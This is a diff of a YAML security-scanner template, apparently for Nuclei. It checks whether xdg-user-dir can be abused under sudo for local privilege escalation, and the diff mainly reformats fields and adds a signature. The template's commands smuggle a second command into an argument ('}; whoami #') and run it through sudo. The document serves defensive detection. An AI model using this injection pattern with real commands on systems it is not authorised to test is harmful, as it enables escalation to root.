@@ -1,5 +1,4 @@
 id: privesc-xdg-user-dir
-
 info:
   name: xdg-user-dir - Privilege Escalation
   author: daffainfo
@@ -9,30 +8,25 @@ info:
   reference:
     - https://gtfobins.github.io/gtfobins/xdg-user-dir/
   metadata:
-    verified: true
     max-request: 3
-  tags: code,linux,xdg-user-dir,privesc,local
-
-self-contained: true
+    verified: true
+  tags: code,linux,local,privesc,xdg-user-dir
 code:
   - engine:
       - sh
       - bash
     source: |
       whoami
-
   - engine:
       - sh
       - bash
     source: |
       xdg-user-dir '}; whoami #'
-
   - engine:
       - sh
       - bash
     source: |
       sudo xdg-user-dir '}; whoami #'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -40,10 +34,10 @@ code:
         words:
           - "root"
         negative: true
-
       - type: dsl
         dsl:
           - 'contains(code_2_response, "root")'
           - 'contains(code_3_response, "root")'
         condition: or
-
+        # digest: 4a0a004730450220151ca80975ed86a6c6a887c74ec01711ccb7e2f7d517d7eee94694593fd602cb02210081f4495053debe3233bffe261dfbe8170832543d71bbba7988256d85ed70b614:922c64590222798bb761d5b6d8e72950
+self-contained: true
